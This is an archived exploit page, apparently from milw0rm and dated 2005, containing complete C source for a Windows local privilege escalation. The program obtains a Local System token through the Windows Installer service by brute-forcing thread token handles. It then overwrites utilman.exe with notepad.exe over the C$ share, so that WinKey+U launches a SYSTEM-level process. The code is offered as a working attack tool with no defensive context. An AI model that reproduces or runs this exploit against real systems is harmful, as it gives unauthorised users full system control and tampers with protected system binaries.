<html><head><title>MS Windows Improper Token Validation Local Exploit (working)</title></head><pre>/* Removed #include &quot;stdafx.h&quot; / str0ke */

#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

#define INFO_BUFFER_SIZE MAX_COMPUTERNAME_LENGTH + 1
#define PATH_SIZE INFO_BUFFER_SIZE + MAX_PATH + 4
typedef UINT (WINAPI* PFnMsiInstallProduct)(LPCSTR szPackagePath, LPCSTR szCommandLine);


int main(int argc, char* argv[])
{
HANDLE hToken,hThread;
HMODULE hMsi = 0;
CHAR infoBuf[INFO_BUFFER_SIZE];
DWORD bufCharCount = INFO_BUFFER_SIZE;
CHAR file1[PATH_SIZE]=&quot;\\\\&quot;;
CHAR file2[PATH_SIZE]=&quot;\\\\&quot;;
CHAR file3[PATH_SIZE]=&quot;\\\\&quot;;

//Get name of the computer. 
GetComputerName(infoBuf, &amp;bufCharCount);

hThread=GetCurrentThread();
hMsi = LoadLibrary(&quot;msi.dll&quot;);

//Invoke windows installer service in order to steal a Local System account identity token.
//Curious? some internal LPC magic here, see *1*
PFnMsiInstallProduct MsiInstallProduct = 0;
MsiInstallProduct = (PFnMsiInstallProduct)GetProcAddress(hMsi, &quot;MsiInstallProductA&quot;);
MsiInstallProduct(&quot;&quot;,&quot;&quot;);

//Get Local System account identity token and set it to current thread
hToken=(void*)0x1;
while(SetThreadToken(&amp;hThread,hToken)==NULL){
hToken=(void*)((int)hToken+1);
}

strcat(file1,infoBuf);
strcat(file1,&quot;\\C$\\winnt\\system32\\utilman.exe&quot;);

strcat(file2,infoBuf);
strcat(file2,&quot;\\C$\\winnt\\system32\\utilmanback.exe&quot;);

strcat(file3,infoBuf);
strcat(file3,&quot;\\C$\\winnt\\system32\\notepad.exe&quot;);

//Replace Utility Manager with Notepad impersonating Local System account
//BTW: fuck Windows file protection :)
if(!CopyFile(file1,file2, TRUE))
printf(&quot;CopyFile() failed: %d\n&quot;, GetLastError());
else
if(!CopyFile(file3,file1, FALSE))
printf(&quot;CopyFile() failed: %d\n&quot;, GetLastError());
else {
printf(&quot;\nPress WinKey+U to run Notepad as Local System\n&quot;);
printf(&quot;Remember to restore original utilman.exe from utilmanback.exe\n&quot;);
}

Sleep(5000);
return 0;
}

// milw0rm.com [2005-01-11]</pre></html>